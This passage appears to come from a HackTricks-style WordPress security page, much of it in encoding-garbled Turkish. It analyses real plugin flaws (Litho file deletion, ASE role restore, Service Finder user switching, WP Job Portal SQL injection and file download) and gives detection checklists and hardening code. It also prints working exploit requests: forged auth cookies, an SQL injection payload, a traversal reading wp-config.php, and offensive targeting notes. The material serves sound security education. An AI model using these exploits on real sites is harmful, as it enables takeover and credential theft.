Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### Tespit kontrol listesi

* `add_action( 'wp_ajax_nopriv_...')` callback'larÄ±nda dosya sistemi yardÄ±mcÄ±larÄ±nÄ± (`copy()`, `unlink()`, `$wp_filesystem->delete()`, vb.) Ã§aÄŸÄ±ran herhangi bir ÅŸey.
* TemizlenmemiÅŸ kullanÄ±cÄ± girdisinin dosya yollarÄ±na eklenmesi (bak: `$_POST`, `$_GET`, `$_REQUEST`).
* `check_ajax_referer()` ve `current_user_can()`/`is_user_logged_in()` yokluÄŸu.

#### SertleÅŸtirme
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// â€¦ proceed â€¦
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ğŸ”’  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Always** disk Ã¼zerinde yapÄ±lacak herhangi bir yazma/silme iÅŸlemini ayrÄ±calÄ±klÄ± (privileged) olarak kabul edin ve ÅŸu konularÄ± iki kez kontrol edin:
> â€¢ Authentication  â€¢ Authorisation  â€¢ Nonce  â€¢ Input sanitisation  â€¢ Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via eskimiÅŸ rolÃ¼n geri yÃ¼klenmesi ve eksik yetkilendirme (ASE "View Admin as Role")

BirÃ§ok eklenti, orijinal rol(leri) daha sonra geri yÃ¼klenebilmesi iÃ§in user meta iÃ§ine kaydederek "view as role" veya geÃ§ici rol deÄŸiÅŸtirme Ã¶zelliÄŸi uygular. EÄŸer geri yÃ¼kleme yolu yalnÄ±zca istek parametrelerine (Ã¶r. `$_REQUEST['reset-for']`) ve eklenti tarafÄ±ndan tutulan bir listeye dayanÄ±yor ve capabilities kontrolÃ¼ ile geÃ§erli bir nonce doÄŸrulamasÄ± yapÄ±lmÄ±yorsa, bu dikey bir privilege escalation'e dÃ¶nÃ¼ÅŸÃ¼r.

GerÃ§ek bir Ã¶rnek Admin and Site Enhancements (ASE) eklentisinde (â‰¤ 7.6.2.1) bulundu. Reset dalÄ±, kullanÄ±cÄ± adÄ± dahili bir dizi `$options['viewing_admin_as_role_are']` iÃ§inde gÃ¶rÃ¼nÃ¼yorsa `reset-for=<username>` bazÄ±nda rolleri geri yÃ¼klÃ¼yordu, fakat mevcut rolleri kaldÄ±rÄ±p kullanÄ±cÄ± metasÄ±ndan `_asenha_view_admin_as_original_roles` ile kaydedilmiÅŸ rolleri yeniden eklemeden Ã¶nce ne `current_user_can()` kontrolÃ¼ ne de nonce doÄŸrulamasÄ± yapÄ±yordu:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Neden sÃ¶mÃ¼rÃ¼lebilir

- `$_REQUEST['reset-for']` ve bir eklenti seÃ§eneÄŸine sunucu tarafÄ± yetkilendirmesi olmadan gÃ¼veniyor.
- Bir kullanÄ±cÄ± daha Ã¶nce `_asenha_view_admin_as_original_roles` iÃ§inde yÃ¼ksek ayrÄ±calÄ±klar kaydetmiÅŸse ve yetkileri dÃ¼ÅŸÃ¼rÃ¼lmÃ¼ÅŸse, reset path'e eriÅŸerek bunlarÄ± geri yÃ¼kleyebilir.
- BazÄ± daÄŸÄ±tÄ±mlarda, herhangi bir kimliÄŸi doÄŸrulanmÄ±ÅŸ kullanÄ±cÄ± `viewing_admin_as_role_are` iÃ§inde hÃ¢lÃ¢ bulunan baÅŸka bir kullanÄ±cÄ± adÄ± iÃ§in reset tetikleyebilir (bozuk yetkilendirme).

SaldÄ±rÄ± Ã¶nkoÅŸullarÄ±

- Ã–zelliÄŸi etkinleÅŸtirilmiÅŸ zafiyetli eklenti sÃ¼rÃ¼mÃ¼.
- Hedef hesabÄ±n, Ã¶nceki kullanÄ±mdan user meta iÃ§inde saklanmÄ±ÅŸ eskimiÅŸ yÃ¼ksek ayrÄ±calÄ±klÄ± bir rolÃ¼ var.
- Herhangi bir kimliÄŸi doÄŸrulanmÄ±ÅŸ oturum; reset akÄ±ÅŸÄ±nda nonce/capability eksik.

Ä°stismar (Ã¶rnek)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Etkilenebilir sÃ¼rÃ¼mlerde bu, mevcut rolleri kaldÄ±rÄ±r ve kaydedilmiÅŸ orijinal rolleri (Ã¶r. `administrator`) yeniden ekler; bu da ayrÄ±calÄ±k yÃ¼kseltimine yol aÃ§ar.

Detection checklist

- KullanÄ±cÄ± meta verisinde â€œoriginal rolesâ€ deÄŸerini saklayan rol-deÄŸiÅŸtirme Ã¶zelliklerini arayÄ±n (Ã¶r. `_asenha_view_admin_as_original_roles`).
- SÄ±fÄ±rlama/geri yÃ¼kleme yollarÄ±nÄ± belirleyin ki:
- KullanÄ±cÄ± adlarÄ±nÄ± `$_REQUEST` / `$_GET` / `$_POST`'ten okuyan.
- Rolleri `add_role()` / `remove_role()` ile, `current_user_can()` ve `wp_verify_nonce()` / `check_admin_referer()` olmadan deÄŸiÅŸtiren.
- Yetkilendirmeyi aktÃ¶rÃ¼n yetenekleri yerine bir eklenti seÃ§enek dizisine (Ã¶r. `viewing_admin_as_role_are`) dayandÄ±ran.

Hardening

- Her durum-deÄŸiÅŸtiren dalda yetenek kontrollerini uygulayÄ±n (Ã¶r. `current_user_can('manage_options')` veya daha sÄ±kÄ±).
- TÃ¼m rol/izin deÄŸiÅŸiklikleri iÃ§in nonce zorunlu kÄ±lÄ±n ve doÄŸrulayÄ±n: `check_admin_referer()` / `wp_verify_nonce()`.
- Ä°stekle gelen kullanÄ±cÄ± adlarÄ±na asla gÃ¼venmeyin; hedef kullanÄ±cÄ±yÄ± sunucu tarafÄ±nda, kimlik doÄŸrulanmÄ±ÅŸ aktÃ¶re ve aÃ§Ä±k politikalara gÃ¶re belirleyin.
- Profil/rol gÃ¼ncellemelerinde â€œoriginal rolesâ€ durumunu geÃ§ersiz kÄ±lÄ±n, bÃ¶ylece eski yÃ¼ksek ayrÄ±calÄ±klarÄ±n geri yÃ¼klenmesini engelleyin:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- GeÃ§ici rol deÄŸiÅŸiklikleri iÃ§in mÃ¼mkÃ¼n olan en az durumu saklamayÄ± ve zaman sÄ±nÄ±rlÄ±, yetki-korumalÄ± belirteÃ§ler kullanmayÄ± dÃ¼ÅŸÃ¼nÃ¼n.

---

### Kimlik doÄŸrulanmamÄ±ÅŸ yetki yÃ¼kseltme â€” public `init` Ã¼zerinde cookieâ€‘trusted user switching (Service Finder â€œsf-bookingâ€)

BazÄ± pluginler, user-switching yardÄ±mcÄ±larÄ±nÄ± public `init` hook'una baÄŸlÄ±yor ve kimliÄŸi bir istemci tarafÄ±ndan kontrol edilen cookie'den tÃ¼retiyor. EÄŸer kod, kimlik doÄŸrulama, yetki ve geÃ§erli bir nonce doÄŸrulamadan `wp_set_auth_cookie()` Ã§aÄŸÄ±rÄ±yorsa, herhangi bir kimlik doÄŸrulanmamÄ±ÅŸ ziyaretÃ§i rastgele bir kullanÄ±cÄ± ID'si olarak giriÅŸ yapmayÄ± zorlayabilir.

Tipik zafiyet deseni (Service Finder Bookings â‰¤ 6.1'den basitleÅŸtirilmiÅŸ):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Neden istismar edilebilir

- Genel eriÅŸime aÃ§Ä±k `init` hook'u, iÅŸleyicinin kimliÄŸi doÄŸrulanmamÄ±ÅŸ kullanÄ±cÄ±lar tarafÄ±ndan eriÅŸilebilir olmasÄ±nÄ± saÄŸlar (hiÃ§bir `is_user_logged_in()` korumasÄ± yok).
- Kimlik, istemci tarafÄ±ndan deÄŸiÅŸtirilebilen bir cookie (`original_user_id`) Ã¼zerinden tÃ¼retilir.
- DoÄŸrudan `wp_set_auth_cookie($uid)` Ã§aÄŸrÄ±sÄ±, istekte bulunananÄ± herhangi bir capability/nonce kontrolÃ¼ olmadan o kullanÄ±cÄ± olarak oturum aÃ§tÄ±rÄ±r.

Ä°stismar (kimliÄŸi doÄŸrulanmamÄ±ÅŸ)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

Genel edge/sunucu WAF'larÄ± geniÅŸ desenlere (SQLi, XSS, LFI) gÃ¶re ayarlanÄ±r. BirÃ§ok yÃ¼ksek etkili WordPress/plugin zaafÄ±, motor WordPress rotalarÄ±nÄ± ve plugin semantiÄŸini anlamadÄ±kÃ§a zararsÄ±z trafik gibi gÃ¶rÃ¼nen uygulamaya Ã¶zgÃ¼ mantÄ±k/kimlik doÄŸrulama hatalarÄ±dÄ±r.

Offensive notes

- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Exercise unauth paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed without obfuscation.
- Typical high-impact cases: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Donâ€™t rely on generic WAF signatures to protect plugin CVEs. Implement application-layer, vulnerability-specific virtual patches or update quickly.
- Prefer positive-security checks in code (capabilities, nonces, strict input validation) over negative regex filters.

## WordPress Protection

### Regular Updates

WordPress, plugins ve temalarÄ±n gÃ¼ncel olduÄŸundan emin olun. AyrÄ±ca otomatik gÃ¼ncellemelerin wp-config.php'de etkinleÅŸtirildiÄŸini doÄŸrulayÄ±n:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Also, **sadece gÃ¼venilir WordPress eklentilerini ve temalarÄ±nÄ± yÃ¼kleyin**.

### Security Plugins

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Other Recommendations**

- VarsayÄ±lan **admin** kullanÄ±cÄ±sÄ±nÄ± kaldÄ±rÄ±n
- **GÃ¼Ã§lÃ¼ parolalar** ve **2FA** kullanÄ±n
- Periyodik olarak kullanÄ±cÄ±larÄ±n **izinlerini** **gÃ¶zden geÃ§irin**
- Brute Force saldÄ±rÄ±larÄ±nÄ± Ã¶nlemek iÃ§in **oturum aÃ§ma denemelerini sÄ±nÄ±rlayÄ±n**
- **`wp-admin.php`** dosyasÄ±nÄ±n adÄ±nÄ± deÄŸiÅŸtirin ve yalnÄ±zca dahili veya belirli IP adreslerinden eriÅŸime izin verin.


### Kimlik doÄŸrulamasÄ± gerektirmeyen yetersiz doÄŸrulama nedeniyle SQL Injection (WP Job Portal <= 2.3.2)

WP Job Portal recruitment plugin, en sonunda `modules/category/model.php::validateFormData()` iÃ§inde aÅŸaÄŸÄ±daki zafiyetli kodu Ã§alÄ±ÅŸtÄ±ran **savecategory** gÃ¶revini aÃ§Ä±ÄŸa Ã§Ä±kardÄ±:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Bu kod parÃ§asÄ±nÄ±n yol aÃ§tÄ±ÄŸÄ± sorunlar:

1. TemizlenmemiÅŸ kullanÄ±cÄ± girdisi â€“ `parentid` HTTP isteÄŸinden doÄŸrudan geliyor.
2. WHERE cÃ¼mlesi iÃ§inde string birleÅŸtirme â€“ `is_numeric()` / `esc_sql()` / prepared statement yok.
3. KimliksÄ±z eriÅŸim â€“ action `admin-post.php` Ã¼zerinden Ã§alÄ±ÅŸtÄ±rÄ±lsa da, yapÄ±lan tek kontrol **CSRF nonce** (`wp_verify_nonce()`), ve bu nonce'u shortcode'u [wpjobportal_my_resumes] iÃ§eren herkese aÃ§Ä±k bir sayfadan herhangi bir ziyaretÃ§i alabilir.

#### Ä°stismar

1. Yeni bir nonce al:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid`'i kÃ¶tÃ¼ye kullanarak rastgele SQL enjekte et:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
YanÄ±t, enjekte edilen sorgunun sonucunu aÃ§Ä±ÄŸa Ã§Ä±karÄ±r veya veritabanÄ±nÄ± deÄŸiÅŸtirerek SQLi'yi kanÄ±tlar.


### KimliksÄ±z Rasgele Dosya Ä°ndirme / Path Traversal (WP Job Portal <= 2.3.2)

BaÅŸka bir gÃ¶rev, **downloadcustomfile**, ziyaretÃ§ilere path traversal yoluyla diskteki **herhangi bir dosyayÄ±** indirme izni veriyordu. Zafiyetli sink `modules/customfield/model.php::downloadCustomUploadedFile()` iÃ§inde yer alÄ±r:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` saldÄ±rgan tarafÄ±ndan kontrol ediliyor ve **temizlenmeden** birleÅŸtiriliyor. Tekrar, tek engel Ã¶zgeÃ§miÅŸ sayfasÄ±ndan alÄ±nabilecek bir **CSRF nonce**.

#### Ä°stismar
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Sunucu `wp-config.php` iÃ§eriÄŸini yanÄ±t olarak dÃ¶ndÃ¼rÃ¼yor, leaking DB credentials and auth keys.

## Referanslar

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
